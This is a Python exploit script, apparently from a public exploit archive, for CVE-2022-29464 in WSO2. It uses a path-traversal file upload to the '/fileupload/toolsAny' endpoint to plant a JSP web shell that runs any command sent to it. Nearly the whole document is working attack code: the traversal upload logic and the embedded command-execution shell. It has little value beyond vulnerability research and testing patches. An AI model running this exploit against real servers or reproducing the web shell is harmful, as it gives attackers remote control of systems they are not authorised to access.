# Exploit Title: WSO2 - Arbitrary File Upload to Remote Command Execution (RCE)
# Date: September 22, 2022
# Exploit Author: hupe1980
# Version: WSO2
# Tested on: Linux
# CVE: CVE-2022-29464

#!/usr/bin/env python3

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = "authenticationendpoint"

shell = """<form>
    <input type="text" name="cmd" />
    <input type="submit" value="Send" />
</form>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
    try {
        Process p = Runtime.getRuntime().exec(cmd,null,null);
        BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String s = null;
        while((s = b.readLine()) != null) { output += s+"</br>"; }
    } catch(IOException e) { e.printStackTrace(); }
}
%>
<pre><%=output %></pre>"""


def exploit(target, filename):
    files = {f"../../../../repository/deployment/server/webapps/{app}/{filename}": shell}
    res = requests.post(f'{target}/fileupload/toolsAny', files=files, verify=False)
    if res.status_code == 200:
        return True
    return False


def main():
    if len(sys.argv) != 3:
        print(f"[+] usage: {sys.argv[0]} <target> <filename>")
        print(f"[+] eg: {sys.argv[0]} https://127.0.0.1:9443 shell.jsp")
        sys.exit(-1)

    target, filename = sys.argv[1:]

    success = exploit(target, filename)
    if success:
        print(f"[+] shell created: {target}/{app}/{filename}")
    else:
        print("[!] upload attempt failed!")


if __name__ == "__main__":
    main()
